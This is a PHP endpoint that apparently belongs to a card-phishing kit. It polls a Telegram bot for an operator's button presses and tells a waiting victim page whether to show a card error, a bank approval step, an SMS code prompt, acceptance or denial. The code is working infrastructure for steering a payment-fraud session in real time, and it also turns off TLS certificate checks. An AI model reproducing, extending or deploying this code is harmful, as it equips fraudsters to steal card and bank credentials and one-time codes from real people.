<?php
session_start();
include "config.php";

header('Content-Type: application/json');

$session_id = isset($_GET['sid']) ? $_GET['sid'] : '';

if (empty($session_id)) {
    echo json_encode(['status' => 'pending']);
    exit();
}

// Poll Telegram for callback queries
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/getUpdates?timeout=1&allowed_updates=[\"callback_query\"]";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

if (isset($data['result']) && is_array($data['result'])) {
    foreach ($data['result'] as $update) {
        if (!isset($update['callback_query'])) continue;

        $cb            = $update['callback_query'];
        $callback_data = $cb['data'];
        $update_id     = $update['update_id'];

        // Match session id in callback
        if (strpos($callback_data, $session_id) === false) continue;

        // Detect decision by PREFIX of callback_data (must come before session_id check)
        if (strpos($callback_data, 'error_card_') === 0) {
            $decision    = 'error_card';
            $answer_text = '❌ Card Error sent!';
        } elseif (strpos($callback_data, 'bank_approve_') === 0) {
            $decision    = 'bank_approve';
            $answer_text = '✅ Bank Approved!';
        } elseif (strpos($callback_data, 'sms_') === 0) {
            $decision    = 'sms';
            $answer_text = '📱 SMS Sent!';
        } elseif (strpos($callback_data, 'accept_') === 0) {
            $decision    = 'accept';
            $answer_text = '✅ Accepted!';
        } elseif (strpos($callback_data, 'deny_') === 0) {
            $decision    = 'deny';
            $answer_text = '❌ Denied!';
        } else {
            $decision    = 'deny';
            $answer_text = '❌ Denied!';
        }

        // Answer callback — removes spinner in Telegram
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery");
        curl_setopt($ch2, CURLOPT_POST, true);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query([
            'callback_query_id' => $cb['id'],
            'text'              => $answer_text
        ]));
        curl_exec($ch2);
        curl_close($ch2);

        // Advance offset so we don't re-read this update
        $ch3 = curl_init();
        curl_setopt($ch3, CURLOPT_URL, "https://api.telegram.org/bot" . BOT_TOKEN . "/getUpdates?offset=" . ($update_id + 1));
        curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch3);
        curl_close($ch3);

        echo json_encode(['status' => $decision]);
        exit();
    }
}

echo json_encode(['status' => 'pending']);
exit();
?>
